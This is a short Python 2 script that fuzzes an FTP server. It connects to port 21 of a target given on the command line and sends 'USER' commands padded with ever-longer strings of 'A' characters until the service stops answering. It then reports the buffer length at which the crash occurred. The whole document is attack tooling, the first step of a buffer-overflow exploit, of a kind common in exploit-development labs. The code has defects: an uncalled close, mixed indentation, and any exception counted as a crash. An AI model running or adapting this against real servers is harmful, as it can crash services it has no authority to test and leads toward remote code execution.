import sys,socket
target = str(sys.argv[1])
buffer = '\x41' * 50
while True:
	try:
		s = socket.socket()
		s.settimeout(2) # set interupt
		s.connect((target,21))
	        s.send('USER'+buffer+'\r\n')
		s.close
#		sleep(1)
		buffer = buffer + '\x41' * 50
	except: # If we fail to connect to the server, we assume its crashed and print the statement below
	    print "[+] Crash occured with buffer length: "+str(len(buffer)-50)
	    sys.exit()

